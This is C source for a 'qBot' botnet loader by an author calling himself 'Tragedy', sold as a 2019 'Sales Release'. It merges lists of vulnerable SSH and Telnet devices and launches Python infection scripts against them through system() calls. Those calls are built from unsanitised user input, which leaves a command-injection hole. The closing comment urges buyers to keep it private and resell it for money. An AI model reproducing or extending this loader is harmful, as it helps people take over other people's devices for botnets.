/*
    Dir Based Loading System For qBot
        - Tragedy
*/
#include <stdio.h> 
#include <stdlib.h>
#include <fcntl.h>
#include <errno.h>
#include "/root/AXHDRS/INC.h"

char *tdir;
char *merge[60];
char *load[60];

int main(int argc, char **argv){
    if(argc < 2){
        printf("\x1b[31m[Invalid Syntax] Usage = ./Loader <Directory(SSH/TELNET)>\x1b[0m\n");
        exit(1);
    }
    int dir;
    if(!strcmp(argv[1], "SSH") || !strcmp(argv[1], "ssh") || !strcmp(argv[1], "S") || !strcmp(argv[1], "s"))
        dir = 1;
    else if(!strcmp(argv[1], "TELNET") || !strcmp(argv[1], "telnet") || !strcmp(argv[1], "T") || !strcmp(argv[1], "t"))
        dir = 2;
    if(dir == 1 || dir == 2){
        char JOB[10];
        char NAME[50];
        char TARG[50];
        printf("\t\t"AXISY" Tragic %s Loader "AXISY"\r\n", argv[1]);
        printf(""W"Merge %s Vulns"R"/"W"Rerun Existing Merge"R"? \r\n"R"("W"MERGE"R"/"W"RERUN"R")"W": ", argv[1]);
        scanf(" %9s", &JOB);
        if(!strcmp(JOB, "MERGE") || !strcmp(JOB, "merge") || !strcmp(JOB, "M") || !strcmp(JOB, "m")){
            printf(""R"["W"Name For New Merge"R"("W"Ex"R": "W"Books.txt"R")]"W": ");
            scanf(" %49s", &NAME);
            if(dir == 1){
                tdir = "/root/Loader/SSH/";
                sprintf(merge, "cd %s; cat * > /root/Loader/%s", tdir, NAME);
                system(merge);
                sprintf(load, "cd /root/Loader/; python -W ignore TragicSSH.py %s", NAME);
                system(load);
                sleep(2);
                exit(0);
            }
            else if(dir == 2){
                tdir = "/root/Loader/TELNET/";
                sprintf(merge, "cd %s; cat * > /root/Loader/%s", tdir, NAME);
                system(merge);
                sprintf(load, "cd /root/Loader/; python -W ignore TragicTEL.py %s", NAME);
                system(load);
                sleep(2);
                exit(0);
            }
        }
        else if(!strcmp(JOB, "RERUN") || !strcmp(JOB, "rerun") || !strcmp(JOB, "R") || !strcmp(JOB, "r")){
            printf(""R"["W"List To Run"R"("W"Ex"R": "W"Books.txt"R")]"W": ");
            scanf(" %49s", &TARG);
            char CHP[2048];
            sprintf(CHP, "/root/Loader/%s", TARG);
            FILE *check;
            if((check = fopen(CHP, "r")) == NULL){
                printf("\x1b[31mError: No File Named '%s', Exiting Now...\x1b[0m\r\n", TARG);
                exit(0);
            }
            else{
                if(dir == 1){
                    tdir = "/root/Loader/SSH/";
                    sprintf(load, "cd /root/Loader/; python -W ignore TragicSSH.py %s", TARG);
                    system(load);
                    sleep(2);
                    exit(0);
                }
                else if(dir == 2){
                    tdir = "/root/Loader/TELNET/";
                    sprintf(load, "cd /root/Loader/; python -W ignore TragicTEL.py %s", TARG);
                    system(load);
                    sleep(2);
                    exit(0);
                }
            }
        }
        else{
            printf("\x1b[31mError: No Job Named '%s', Exiting Now...\x1b[0m\r\n", JOB);
            exit(0);
        }
    }
    else{
        printf("\x1b[31mError: No Directory Named '%s', Exiting Now...\x1b[0m\r\n", argv[1]);
        exit(0);
    }
    exit(0);
}
/*
    Modifying This Code Is Permitted, However, Ripping Code From This/Removing Credits Is The Lowest Of The Low.
    Sales Release 10/5/2019
    KEEP IT PRIVATE; I'd Rather You Sell It Than Give It Away Or Post Somewhere. We're All Here To Make Money!
    Much Love 
        - Tragedy
*/